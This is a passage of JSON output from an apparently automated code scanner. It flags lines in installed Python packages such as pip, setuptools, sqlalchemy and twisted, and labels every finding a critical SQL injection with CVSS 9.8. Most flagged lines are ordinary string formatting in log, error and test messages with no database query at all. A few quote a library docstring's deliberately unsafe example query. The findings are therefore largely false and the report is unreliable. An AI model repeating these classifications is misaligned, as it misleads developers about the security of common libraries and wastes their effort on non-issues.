            "context": "\n                    text += (\n                        f\" SELECT {colnames_w_cast} FROM \"\n                        f\"(VALUES ({insert_single_values_expr})) \"\n                        f\"AS imp_sen({colnames}, sen_counter) \"",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/base.py",
            "line": 3208,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ").format(view_name)",
            "context": "                    \"SELECT name FROM {} WHERE name IN \"\n                    \"('dm_exec_sessions', 'dm_pdw_nodes_exec_sessions')\"\n                ).format(view_name)\n            )\n            row = cursor.fetchone()",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/base.py",
            "line": 3231,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"\"\".format(",
            "context": "                    FROM {}\n                    where session_id = @@SPID\n                \"\"\".format(\n                    view_name\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/base.py",
            "line": 3238,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'attempting to query the \"{}\" view.'.format(err, view_name)",
            "context": "            raise NotImplementedError(\n                \"Can't fetch isolation level;  encountered error {} when \"\n                'attempting to query the \"{}\" view.'.format(err, view_name)\n            ) from err\n        else:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/sqlite/base.py",
            "line": 2251,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"SELECT name FROM {main} \"",
            "context": "            filter_table = \"\"\n        query = (\n            f\"SELECT name FROM {main} \"\n            f\"WHERE type='{type_}'{filter_table} \"\n            \"ORDER BY name\"",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/base.py",
            "line": 2658,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "cursor.execute(\"SELECT VERSION() LIKE '%MariaDB%'\")",
            "context": "        try:\n            cursor = conn.cursor()\n            cursor.execute(\"SELECT VERSION() LIKE '%MariaDB%'\")\n            val = cursor.fetchone()[0]\n        except:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/charset_normalizer/cli/__main__.py",
            "line": 311,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'\"{}\" file does not need to be normalized, as it already came from unicode.'.format(",
            "context": "                if best_guess.encoding.startswith(\"utf\") is True:\n                    print(\n                        '\"{}\" file does not need to be normalized, as it already came from unicode.'.format(\n                            my_file.name\n                        ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_distutils_adoption.py",
            "line": 193,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "ENSURE_CONSISTENT_ERROR_FROM_MODIFIED_PY.format(",
            "context": "        'python',\n        '-c',\n        ENSURE_CONSISTENT_ERROR_FROM_MODIFIED_PY.format(\n            imported_module=imported_module\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/command/_requirestxt.py",
            "line": 123,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "data.write('\\n[{extra}]\\n'.format(**vars()))",
            "context": "    _write_requirements(data, install_requires)\n    for extra in sorted(extras_require):\n        data.write('\\n[{extra}]\\n'.format(**vars()))\n        _write_requirements(data, extras_require[extra])\n    cmd.write_or_delete_file(\"requirements\", filename, data.getvalue())",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/cmd.py",
            "line": 545,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "exec_msg = \"generating {} from {}\".format(outfile, ', '.join(infiles))",
            "context": "\n        if exec_msg is None:\n            exec_msg = \"generating {} from {}\".format(outfile, ', '.join(infiles))\n\n        # If 'outfile' must be regenerated (either because it doesn't",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/typing_extensions.py",
            "line": 2105,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
            "line": 264,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-dir.{data__packagedir_key}\".format(**locals()) + \" must be string\", value=data__packagedir_val, name=\"\" + (name_prefix or \"data\") + \".package-dir.{data__packagedir_key}\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')",
            "context": "                            data__packagedir_keys.remove(data__packagedir_key)\n                        if not isinstance(data__packagedir_val, (str)):\n                            raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-dir.{data__packagedir_key}\".format(**locals()) + \" must be string\", value=data__packagedir_val, name=\"\" + (name_prefix or \"data\") + \".package-dir.{data__packagedir_key}\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')\n                if data__packagedir_keys:\n                    raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-dir must not contain \"+str(data__packagedir_keys)+\" properties\", value=data__packagedir, name=\"\" + (name_prefix or \"data\") + \".package-dir\", definition={'$$description': [':class:`dict`-like structure mapping from package names to directories where their', 'code can be found.', 'The empty string (as key) means that all packages are contained inside', 'the given directory will be included in the distribution.'], 'type': 'object', 'additionalProperties': False, 'propertyNames': {'anyOf': [{'const': ''}, {'$id': '#/definitions/package-name', 'title': 'Valid package name', 'description': 'Valid package name (importable or :pep:`561`).', 'type': 'string', 'anyOf': [{'type': 'string', 'format': 'python-module-name-relaxed'}, {'type': 'string', 'format': 'pep561-stub-name'}]}]}, 'patternProperties': {'^.*$': {'type': 'string'}}}, rule='additionalProperties')",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
            "line": 309,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-data.{data__packagedata_key}[{data__packagedata_val_x}]\".format(**locals()) + \" must be string\", value=data__packagedata_val_item, name=\"\" + (name_prefix or \"data\") + \".package-data.{data__packagedata_key}[{data__packagedata_val_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')",
            "context": "                            for data__packagedata_val_x, data__packagedata_val_item in enumerate(data__packagedata_val):\n                                if not isinstance(data__packagedata_val_item, (str)):\n                                    raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-data.{data__packagedata_key}[{data__packagedata_val_x}]\".format(**locals()) + \" must be string\", value=data__packagedata_val_item, name=\"\" + (name_prefix or \"data\") + \".package-data.{data__packagedata_key}[{data__packagedata_val_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')\n                if data__packagedata_keys:\n                    raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".package-data must not contain \"+str(data__packagedata_keys)+\" properties\", value=data__packagedata, name=\"\" + (name_prefix or \"data\") + \".package-data\", definition={'$$description': ['Mapping from package names to lists of glob patterns.', 'Usually this option is not needed when using ``include-package-data = true``', 'For more information on how to include data files, check ``setuptools`` `docs', '<https://setuptools.pypa.io/en/latest/userguide/datafiles.html>`_.'], 'type': 'object', 'additionalProperties': False, 'propertyNames': {'anyOf': [{'type': 'string', 'format': 'python-module-name'}, {'const': '*'}]}, 'patternProperties': {'^.*$': {'type': 'array', 'items': {'type': 'string'}}}}, rule='additionalProperties')",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
            "line": 363,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".exclude-package-data.{data__excludepackagedata_key}[{data__excludepackagedata_val_x}]\".format(**locals()) + \" must be string\", value=data__excludepackagedata_val_item, name=\"\" + (name_prefix or \"data\") + \".exclude-package-data.{data__excludepackagedata_key}[{data__excludepackagedata_val_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')",
            "context": "                            for data__excludepackagedata_val_x, data__excludepackagedata_val_item in enumerate(data__excludepackagedata_val):\n                                if not isinstance(data__excludepackagedata_val_item, (str)):\n                                    raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".exclude-package-data.{data__excludepackagedata_key}[{data__excludepackagedata_val_x}]\".format(**locals()) + \" must be string\", value=data__excludepackagedata_val_item, name=\"\" + (name_prefix or \"data\") + \".exclude-package-data.{data__excludepackagedata_key}[{data__excludepackagedata_val_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')\n                if data__excludepackagedata_keys:\n                    raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".exclude-package-data must not contain \"+str(data__excludepackagedata_keys)+\" properties\", value=data__excludepackagedata, name=\"\" + (name_prefix or \"data\") + \".exclude-package-data\", definition={'$$description': ['Mapping from package names to lists of glob patterns that should be excluded', 'For more information on how to include data files, check ``setuptools`` `docs', '<https://setuptools.pypa.io/en/latest/userguide/datafiles.html>`_.'], 'type': 'object', 'additionalProperties': False, 'propertyNames': {'anyOf': [{'type': 'string', 'format': 'python-module-name'}, {'const': '*'}]}, 'patternProperties': {'^.*$': {'type': 'array', 'items': {'type': 'string'}}}}, rule='additionalProperties')",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
            "line": 907,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".find.where[{data__find__where_x}]\".format(**locals()) + \" must be string\", value=data__find__where_item, name=\"\" + (name_prefix or \"data\") + \".find.where[{data__find__where_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')",
            "context": "                        for data__find__where_x, data__find__where_item in enumerate(data__find__where):\n                            if not isinstance(data__find__where_item, (str)):\n                                raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".find.where[{data__find__where_x}]\".format(**locals()) + \" must be string\", value=data__find__where_item, name=\"\" + (name_prefix or \"data\") + \".find.where[{data__find__where_x}]\".format(**locals()) + \"\", definition={'type': 'string'}, rule='type')\n                if \"exclude\" in data__find_keys:\n                    data__find_keys.remove(\"exclude\")",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
            "line": 1347,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".dynamic[{data__dynamic_x}]\".format(**locals()) + \" must be one of ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']\", value=data__dynamic_item, name=\"\" + (name_prefix or \"data\") + \".dynamic[{data__dynamic_x}]\".format(**locals()) + \"\", definition={'enum': ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']}, rule='enum')",
            "context": "                for data__dynamic_x, data__dynamic_item in enumerate(data__dynamic):\n                    if data__dynamic_item not in ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']:\n                        raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \".dynamic[{data__dynamic_x}]\".format(**locals()) + \" must be one of ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']\", value=data__dynamic_item, name=\"\" + (name_prefix or \"data\") + \".dynamic[{data__dynamic_x}]\".format(**locals()) + \"\", definition={'enum': ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']}, rule='enum')\n        if data_keys:\n            raise JsonSchemaValueException(\"\" + (name_prefix or \"data\") + \" must not contain \"+str(data_keys)+\" properties\", value=data, name=\"\" + (name_prefix or \"data\") + \"\", definition={'$schema': 'http://json-schema.org/draft-07/schema#', '$id': 'https://packaging.python.org/en/latest/specifications/pyproject-toml/', 'title': 'Package metadata stored in the ``project`` table', '$$description': ['Data structure for the **project** table inside ``pyproject.toml``', '(as initially defined in :pep:`621`)'], 'type': 'object', 'properties': {'name': {'type': 'string', 'description': 'The name (primary identifier) of the project. MUST be statically defined.', 'format': 'pep508-identifier'}, 'version': {'type': 'string', 'description': 'The version of the project as supported by :pep:`440`.', 'format': 'pep440'}, 'description': {'type': 'string', '$$description': ['The `summary description of the project', '<https://packaging.python.org/specifications/core-metadata/#summary>`_']}, 'readme': {'$$description': ['`Full/detailed description of the project in the form of a README', '<https://peps.python.org/pep-0621/#readme>`_', \"with meaning similar to the one defined in `core metadata's Description\", '<https://packaging.python.org/specifications/core-metadata/#description>`_'], 'oneOf': [{'type': 'string', '$$description': ['Relative path to a text file (UTF-8) containing the full description', 'of the project. If the file path ends in case-insensitive ``.md`` or', '``.rst`` suffixes, then the content-type is respectively', '``text/markdown`` or ``text/x-rst``']}, {'type': 'object', 'allOf': [{'anyOf': [{'properties': {'file': {'type': 'string', '$$description': ['Relative path to a text file containing the full description', 'of the project.']}}, 'required': ['file']}, {'properties': {'text': {'type': 'string', 'description': 'Full text describing the project.'}}, 'required': ['text']}]}, {'properties': {'content-type': {'type': 'string', '$$description': ['Content-type (:rfc:`1341`) of the full description', '(e.g. ``text/markdown``). The ``charset`` parameter is assumed', 'UTF-8 when not present.'], '$comment': 'TODO: add regex pattern or format?'}}, 'required': ['content-type']}]}]}, 'requires-python': {'type': 'string', 'format': 'pep508-versionspec', '$$description': ['`The Python version requirements of the project', '<https://packaging.python.org/specifications/core-metadata/#requires-python>`_.']}, 'license': {'description': '`Project license <https://peps.python.org/pep-0621/#license>`_.', 'oneOf': [{'type': 'string', 'description': 'An SPDX license identifier', 'format': 'SPDX'}, {'type': 'object', 'properties': {'file': {'type': 'string', '$$description': ['Relative path to the file (UTF-8) which contains the license for the', 'project.']}}, 'required': ['file']}, {'type': 'object', 'properties': {'text': {'type': 'string', '$$description': ['The license of the project whose meaning is that of the', '`License field from the core metadata', '<https://packaging.python.org/specifications/core-metadata/#license>`_.']}}, 'required': ['text']}]}, 'license-files': {'description': 'Paths or globs to paths of license files', 'type': 'array', 'items': {'type': 'string'}}, 'authors': {'type': 'array', 'items': {'$id': '#/definitions/author', 'title': 'Author or Maintainer', '$comment': 'https://peps.python.org/pep-0621/#authors-maintainers', 'type': 'object', 'additionalProperties': False, 'properties': {'name': {'type': 'string', '$$description': ['MUST be a valid email name, i.e. whatever can be put as a name, before an', 'email, in :rfc:`822`.']}, 'email': {'type': 'string', 'format': 'idn-email', 'description': 'MUST be a valid email address'}}}, '$$description': [\"The people or organizations considered to be the 'authors' of the project.\", 'The exact meaning is open to interpretation (e.g. original or primary authors,', 'current maintainers, or owners of the package).']}, 'maintainers': {'type': 'array', 'items': {'$id': '#/definitions/author', 'title': 'Author or Maintainer', '$comment': 'https://peps.python.org/pep-0621/#authors-maintainers', 'type': 'object', 'additionalProperties': False, 'properties': {'name': {'type': 'string', '$$description': ['MUST be a valid email name, i.e. whatever can be put as a name, before an', 'email, in :rfc:`822`.']}, 'email': {'type': 'string', 'format': 'idn-email', 'description': 'MUST be a valid email address'}}}, '$$description': [\"The people or organizations considered to be the 'maintainers' of the project.\", 'Similarly to ``authors``, the exact meaning is open to interpretation.']}, 'keywords': {'type': 'array', 'items': {'type': 'string'}, 'description': 'List of keywords to assist searching for the distribution in a larger catalog.'}, 'classifiers': {'type': 'array', 'items': {'type': 'string', 'format': 'trove-classifier', 'description': '`PyPI classifier <https://pypi.org/classifiers/>`_.'}, '$$description': ['`Trove classifiers <https://pypi.org/classifiers/>`_', 'which apply to the project.']}, 'urls': {'type': 'object', 'description': 'URLs associated with the project in the form ``label => value``.', 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'string', 'format': 'url'}}}, 'scripts': {'$id': '#/definitions/entry-point-group', 'title': 'Entry-points', 'type': 'object', '$$description': ['Entry-points are grouped together to indicate what sort of capabilities they', 'provide.', 'See the `packaging guides', '<https://packaging.python.org/specifications/entry-points/>`_', 'and `setuptools docs', '<https://setuptools.pypa.io/en/latest/userguide/entry_point.html>`_', 'for more information.'], 'propertyNames': {'format': 'python-entrypoint-name'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'string', '$$description': ['Reference to a Python object. It is either in the form', '``importable.module``, or ``importable.module:object.attr``.'], 'format': 'python-entrypoint-reference', '$comment': 'https://packaging.python.org/specifications/entry-points/'}}}, 'gui-scripts': {'$id': '#/definitions/entry-point-group', 'title': 'Entry-points', 'type': 'object', '$$description': ['Entry-points are grouped together to indicate what sort of capabilities they', 'provide.', 'See the `packaging guides', '<https://packaging.python.org/specifications/entry-points/>`_', 'and `setuptools docs', '<https://setuptools.pypa.io/en/latest/userguide/entry_point.html>`_', 'for more information.'], 'propertyNames': {'format': 'python-entrypoint-name'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'string', '$$description': ['Reference to a Python object. It is either in the form', '``importable.module``, or ``importable.module:object.attr``.'], 'format': 'python-entrypoint-reference', '$comment': 'https://packaging.python.org/specifications/entry-points/'}}}, 'entry-points': {'$$description': ['Instruct the installer to expose the given modules/functions via', '``entry-point`` discovery mechanism (useful for plugins).', 'More information available in the `Python packaging guide', '<https://packaging.python.org/specifications/entry-points/>`_.'], 'propertyNames': {'format': 'python-entrypoint-group'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'$id': '#/definitions/entry-point-group', 'title': 'Entry-points', 'type': 'object', '$$description': ['Entry-points are grouped together to indicate what sort of capabilities they', 'provide.', 'See the `packaging guides', '<https://packaging.python.org/specifications/entry-points/>`_', 'and `setuptools docs', '<https://setuptools.pypa.io/en/latest/userguide/entry_point.html>`_', 'for more information.'], 'propertyNames': {'format': 'python-entrypoint-name'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'string', '$$description': ['Reference to a Python object. It is either in the form', '``importable.module``, or ``importable.module:object.attr``.'], 'format': 'python-entrypoint-reference', '$comment': 'https://packaging.python.org/specifications/entry-points/'}}}}}, 'dependencies': {'type': 'array', 'description': 'Project (mandatory) dependencies.', 'items': {'$id': '#/definitions/dependency', 'title': 'Dependency', 'type': 'string', 'description': 'Project dependency specification according to PEP 508', 'format': 'pep508'}}, 'optional-dependencies': {'type': 'object', 'description': 'Optional dependency for the project', 'propertyNames': {'format': 'pep508-identifier'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'array', 'items': {'$id': '#/definitions/dependency', 'title': 'Dependency', 'type': 'string', 'description': 'Project dependency specification according to PEP 508', 'format': 'pep508'}}}}, 'dynamic': {'type': 'array', '$$description': ['Specifies which fields are intentionally unspecified and expected to be', 'dynamically provided by build tools'], 'items': {'enum': ['version', 'description', 'readme', 'requires-python', 'license', 'license-files', 'authors', 'maintainers', 'keywords', 'classifiers', 'urls', 'scripts', 'gui-scripts', 'entry-points', 'dependencies', 'optional-dependencies']}}}, 'required': ['name'], 'additionalProperties': False, 'allOf': [{'if': {'not': {'required': ['dynamic'], 'properties': {'dynamic': {'contains': {'const': 'version'}, '$$description': ['version is listed in ``dynamic``']}}}, '$$comment': ['According to :pep:`621`:', '    If the core metadata specification lists a field as \"Required\", then', '    the metadata MUST specify the field statically or list it in dynamic', 'In turn, `core metadata`_ defines:', '    The required fields are: Metadata-Version, Name, Version.', '    All the other fields are optional.', 'Since ``Metadata-Version`` is defined by the build back-end, ``name`` and', '``version`` are the only mandatory information in ``pyproject.toml``.', '.. _core metadata: https://packaging.python.org/specifications/core-metadata/']}, 'then': {'required': ['version'], '$$description': ['version should be statically defined in the ``version`` field']}}, {'if': {'required': ['license-files']}, 'then': {'properties': {'license': {'type': 'string'}}}}], 'definitions': {'author': {'$id': '#/definitions/author', 'title': 'Author or Maintainer', '$comment': 'https://peps.python.org/pep-0621/#authors-maintainers', 'type': 'object', 'additionalProperties': False, 'properties': {'name': {'type': 'string', '$$description': ['MUST be a valid email name, i.e. whatever can be put as a name, before an', 'email, in :rfc:`822`.']}, 'email': {'type': 'string', 'format': 'idn-email', 'description': 'MUST be a valid email address'}}}, 'entry-point-group': {'$id': '#/definitions/entry-point-group', 'title': 'Entry-points', 'type': 'object', '$$description': ['Entry-points are grouped together to indicate what sort of capabilities they', 'provide.', 'See the `packaging guides', '<https://packaging.python.org/specifications/entry-points/>`_', 'and `setuptools docs', '<https://setuptools.pypa.io/en/latest/userguide/entry_point.html>`_', 'for more information.'], 'propertyNames': {'format': 'python-entrypoint-name'}, 'additionalProperties': False, 'patternProperties': {'^.+$': {'type': 'string', '$$description': ['Reference to a Python object. It is either in the form', '``importable.module``, or ``importable.module:object.attr``.'], 'format': 'python-entrypoint-reference', '$comment': 'https://packaging.python.org/specifications/entry-points/'}}}, 'dependency': {'$id': '#/definitions/dependency', 'title': 'Dependency', 'type': 'string', 'description': 'Project dependency specification according to PEP 508', 'format': 'pep508'}}}, rule='additionalProperties')",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/more.py",
            "line": 1252,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> func = lambda item: print('Received {}'.format(item))",
            "context": "\n        >>> from more_itertools import consume\n        >>> func = lambda item: print('Received {}'.format(item))\n        >>> consume(side_effect(func, range(2)))\n        Received 0",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1990,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/req/req_file.py",
            "line": 181,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "line_comes_from = \"{} {} (line {})\".format(",
            "context": ") -> ParsedRequirement:\n    # preserve for the nested code path\n    line_comes_from = \"{} {} (line {})\".format(\n        \"-c\" if line.constraint else \"-r\",\n        line.filename,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/models/search_scope.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Looking in links: {}\".format(",
            "context": "        if self.find_links:\n            lines.append(\n                \"Looking in links: {}\".format(\n                    \", \".join(redact_auth_from_url(url) for url in self.find_links)\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/resolution/resolvelib/candidates.py",
            "line": 194,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"{} {} (from {})\".format(",
            "context": "\n    def format_for_error(self) -> str:\n        return \"{} {} (from {})\".format(\n            self.name,\n            self.version,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/idna/core.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))",
            "context": "        if direction == '':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))\n        if direction in ['R', 'AL', 'AN']:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
            "line": 75,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "six.unichr(cc): u\"%{:02X}\".format(cc)",
            "context": "_HTML5_REPLACEMENTS.update(\n    {\n        six.unichr(cc): u\"%{:02X}\".format(cc)\n        for cc in range(0x00, 0x1F + 1)\n        if cc not in (0x1B,)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/packaging/tags.py",
            "line": 163,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"cp{version}{debug}{pymalloc}{ucs4}\".format(",
            "context": "    abis.insert(\n        0,\n        \"cp{version}{debug}{pymalloc}{ucs4}\".format(\n            version=version, debug=debug, pymalloc=pymalloc, ucs4=ucs4\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 624,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 751,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 4174,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Code {!r} with value {!r} missing from RESPONSE dict\".format(",
            "context": "                    value,\n                    allValues,\n                    \"Code {!r} with value {!r} missing from RESPONSE dict\".format(\n                        key, value\n                    ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_defer.py",
            "line": 663,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Result should have been from second deferred:{}\".format(",
            "context": "            self.callbackResults[0][0],\n            2,\n            \"Result should have been from second deferred:{}\".format(\n                self.callbackResults\n            ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/scripts/_twistd_unix.py",
            "line": 104,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Can't check status of PID {} from pidfile {}: {}\".format(",
            "context": "            else:\n                sys.exit(\n                    \"Can't check status of PID {} from pidfile {}: {}\".format(\n                        pid, pidfile, why\n                    )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/domhelpers.py",
            "line": 18,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "warningString = \"twisted.web.domhelpers was deprecated at {}\".format(",
            "context": "from twisted.web.microdom import escape, getElementsByTagName, unescape\n\nwarningString = \"twisted.web.domhelpers was deprecated at {}\".format(\n    getVersionString(Version(\"Twisted\", 23, 10, 0))\n)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/microdom.py",
            "line": 35,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "warningString = \"twisted.web.microdom was deprecated at {}\".format(",
            "context": "from twisted.web.sux import ParseError, XMLParser\n\nwarningString = \"twisted.web.microdom was deprecated at {}\".format(\n    getVersionString(Version(\"Twisted\", 23, 10, 0))\n)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/positioning/test/test_base.py",
            "line": 86,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "self.assertEqual(repr(heading), reprTemplate.format(angle, variation))",
            "context": "        heading = base.Heading.fromFloats(angle, variationValue=variation)\n        reprTemplate = \"<Heading ({0} degrees, <Variation ({1} degrees)>)>\"\n        self.assertEqual(repr(heading), reprTemplate.format(angle, variation))\n\n    def test_valueEquality(self) -> None:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/logger/test/test_format.py",
            "line": 95,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"hello world\", self.format(\"hello {what.where()}\", what=World())",
            "context": "\n        self.assertEqual(\n            \"hello world\", self.format(\"hello {what.where()}\", what=World())\n        )\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 196,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"URL.from_text({})\".format(repr(\"http://foo/bar?baz&k=v#frob\")),",
            "context": "                )\n            ),\n            \"URL.from_text({})\".format(repr(\"http://foo/bar?baz&k=v#frob\")),\n        )\n",
            "cvss_score": 9.8
          },
